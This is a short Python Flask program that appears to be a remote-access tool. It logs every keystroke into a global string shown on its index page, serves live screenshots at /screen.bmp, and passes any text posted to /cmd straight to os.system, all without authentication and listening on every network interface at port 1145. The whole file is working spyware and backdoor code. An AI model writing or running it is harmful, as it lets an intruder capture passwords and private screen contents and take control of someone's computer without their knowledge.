from flask import Flask, render_template, request
from keyboard import on_press
from PIL import ImageGrab
from io import BytesIO
from os import system

app = Flask(__name__)
s = ""


@app.after_request
def disable_caching(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Expires'] = '-1'
    response.headers['Pragma'] = 'no-cache'
    return response


def press(event):
    global s
    s += event.name + " "


@app.route("/clear")
def clear():
    global s
    s = ""
    return render_template("back.html")


@app.route("/screen.bmp")
def screen():
    buf = BytesIO()
    ImageGrab.grab().save(buf, format="BMP", quality=0)
    return buf.getvalue()


@app.route("/cmd", methods=["POST"])
def cmd():
    system(request.form.get("area"))
    return render_template("back.html")


@app.route("/")
def index():
    return render_template("index.html", s=s)


if __name__ == "__main__":
    on_press(press)
    app.run(host="0.0.0.0", port=1145)
